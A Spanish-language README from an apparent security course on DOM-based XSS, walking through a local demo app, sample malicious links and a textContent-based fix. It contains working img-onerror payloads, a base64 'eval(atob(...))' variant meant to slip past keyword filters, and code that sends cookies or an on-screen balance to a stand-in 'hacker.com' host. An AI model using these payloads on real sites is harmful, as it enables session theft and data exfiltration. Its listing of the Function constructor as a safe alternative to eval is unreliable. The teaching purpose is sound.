
# XSS DOM-Based

## Levantando el cliente

Desde la carpeta raíz hacemos

```bash
cd apps/xss-dom-based/client
pnpm dev
```

## Origen de la vulnerabilidad

El origen de esta vulnerabilidad está en un `hiddenSink` dentro del código del cliente: una función o código JavaScript que recibe datos de una fuente no confiable (como el hash de la URL) y los procesa de manera insegura. Este código pudo haber sido:

- **Escrito por un desarrollador** que no validó correctamente las entradas del usuario (o lo escribió como una herramienta de debugging)
- **Inyectado por un atacante** que comprometió la página web (por ejemplo, mediante una inyección previa en el servidor o en un CDN comprometido)

El problema surge cuando ese `hiddenSink` toma datos controlables por el usuario y los coloca en el DOM sin sanitización, permitiendo la ejecución de código malicioso.

## Ejemplo de ataque

Para probar la vulnerabilidad, vamos a simular un mail que nos llega con el siguiente link:

```
http://localhost:5173/index.html#<img src=x onerror="alert('DOM XSS: Robando tokens de Banco Alas...');">
```

El código malicioso se inyecta en el DOM, pero en este caso se trata de un alert: el ataque es visible.


## Un ejemplo más realista

Si el link del mail fuera algo como ésto

```
http://localhost:5173/index.html#<img src=x onerror="
  fetch('https://jsonplaceholder.typicode.com/posts?_limit=10')
    .then(r => r.json())
    .then(data => {
      console.log('--- EXFILTRACIÓN DE DATOS EXITOSA ---');
      console.log('Posts obtenidos:', data.length);
      console.log('Datos:', data);
      alert('XSS DOM-Based: He obtenido ' + data.length + ' posts');
    })
">
```

o incluso algo un poco más ofuscado, difícil de detectar:

```
http://localhost:5173/index.html#<img src=x onerror="const f=fetch,l=console.log;f('https://jsonplaceholder.typicode.com/posts?_limit=10').then(r=>r.json()).then(d=>{l('--- EXFILTRACIÓN ---');l('Posts:'+d.length);alert('XSS: '+d.length+' posts')})">
```

<img src="./images/xss-dom-based-original.png" alt="XSS DOM Based original" width="80%" height="80%">

### Exfiltración de datos

Fíjense que lo que produce es una exfiltración de datos: se obtiene información y se envía a un servidor externo controlado por el atacante. En este ejemplo es solo información pública, pero en un ataque real podría ser información sensible del usuario, como

- cookies
- tokens de sesión en localStorage
- datos de formulario en el DOM

Podríamos hacer algo como

```ts
const sessionCookie = document.cookie
// Exfiltración inmediata al servidor del hacker
fetch('https://hacker.com/steal?data=' + btoa(sessionCookie))
```

`btoa` o Binary to ASCII toma una cadena de datos y los codifica en Base 64, de manera que alguien que esté mirando en la solapa Network no se daría cuenta a simple vista la información que estamos recibiendo:

```
https://hacker.com/log?data=dXNlcj1GZXJuYW5kbzsgdG9rZW49QUJDLTEyMw==
```

Fíjense que con un simple comando se puede obtener información más que interesante:

```bash
echo "dXNlcj1GZXJuYW5kbzsgdG9rZW49QUJDLTEyMw==" | base64 -d
# Resultado: user=Fernando; token=ABC-123
```

A diferencia del CSRF, el atacante roba la sesión para él ingresar desde su navegador a la app haciéndose pasar por el usuario real.

### ¿httpOnly?

Si la cookie es marcada como `httpOnly` eso no asegura 100% que no haya exfiltración de datos. Podemos por ejemplo saber cuál es el saldo del usuario al que hackeamos, conociendo cómo está definida la estructura de la página web:

```ts
// Robando el saldo que aparece en pantalla aunque no pueda leer la cookie
const saldo = document.getElementById('saldo-total').textContent
fetch('https://hacker.com/log?saldo=' + saldo)
```

## Técnica atob

Otra técnica de ofuscación consiste en usar la función `atob` para decodificar datos codificados en base64 (con `btoa` como vimos anteriormente). El mismo link anterior sería

```
http://localhost:5173/index.html#<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vanNvbnBsYWNlaG9sZGVyLnR5cGljb2RlLmNvbS9wb3N0cz9fbGltaXQ9MTAnKS50aGVuKHI9PnIuanNvbigpKS50aGVuKGQ9Pntjb25zb2xlLmxvZygnLS0tIEVYRklMVFJBQ0kPTiAtLS0nKTtjb25zb2xlLmxvZygnUG9zdHM6JytkLmxlbmd0aCk7YWxlcnQoJ1hTUzogJytkLmxlbmd0aCsnIHBvc3RzJyl9KSk='))">
```

El payload parece tan ininteligible como inocente, pero sin embargo...

```bash
echo "ZmV0Y2goJ2h0dHBzOi8vanNvbnBsYWNlaG9sZGVyLnR5cGljb2RlLmNvbS9wb3N0cz9fbGltaXQ9MTAnKS50aGVuKHI9PnIuanNvbigpKS50aGVuKGQ9Pntjb25zb2xlLmxvZygnLS0tIEVYRklMVFJBQ0kPTiAtLS0nKTtjb25zb2xlLmxvZygnUG9zdHM6JytkLmxlbmd0aCk7YWxlcnQoJ1hTUzogJytkLmxlbmd0aCsnIHBvc3RzJyl9KSk=" | base64 -d
# produce como resultado
fetch('https://jsonplaceholder.typicode.com/posts?_limit=10').then(r=>r.json()).then(d=>{console.log('--- EXFILTRACIÓN ---');console.log('Posts:'+d.length);alert('XSS: '+d.length+' posts')})
```

Muchos firewalls o scripts validan el uso de palabras claves como fetch, alert, document.cookie o script, de esta manera solo se ve una cadena de caracteres sin sentido. Si querés investigar más al respecto, podés estudiar en el link [Cyberchef](https://gchq.github.io/CyberChef/) y como siempre en [MDN](https://developer.mozilla.org/es/docs/Glossary/Base64).

## Cómo mitigarlo

Podemos armar una tabla de "sinks" o elementos peligrosos que puedan ser usados para inyectar código:

| Sink | Alternativa |
|------|-------------|
| `innerHTML` | `element.textContent` |
| `outerHTML` | `element.outerText` |
| `document.write()` | `element.textContent` |
| `eval()` | `Function constructor` o validación estricta de entradas |

Dado que el ejemplo es didáctico, está claro que la forma de resolverlo es borrando el `hiddenSink` y recibir los datos de forma segura:

```html
  <script type="module">
    const userNameDisplay = document.getElementById('userNameDisplay')

    const initializeVerification = () => {
      const fragmentoUrl = window.location.hash.substring(1)
      
      if (fragmentoUrl) {
        const datosUsuario = decodeURIComponent(fragmentoUrl)
        
        // MITIGACIÓN: Usamos textContent. 
        // Si datosUsuario contiene un <script> o un <img>, 
        // se mostrará el texto literal en pantalla y NO se ejecutará nada.
        userNameDisplay.textContent = datosUsuario
      } else {
        userNameDisplay.textContent = 'Fernando'
      }
    }

    window.addEventListener('load', initializeVerification)
  </script>
```

De esa manera vemos simplemente los datos que nos pasaron sin ejecutar ningún código malicioso.

<img src="./images/xss-dom-based-mitigado.png" alt="XSS DOM Based mitigado" width="50%" height="50%">

## Links

- [CSRF](../csrf-vulnerable/)
- [XSS Stored](../xss-stored/)
- [XSS Reflected](../xss-reflected/)
- [Página principal](../..)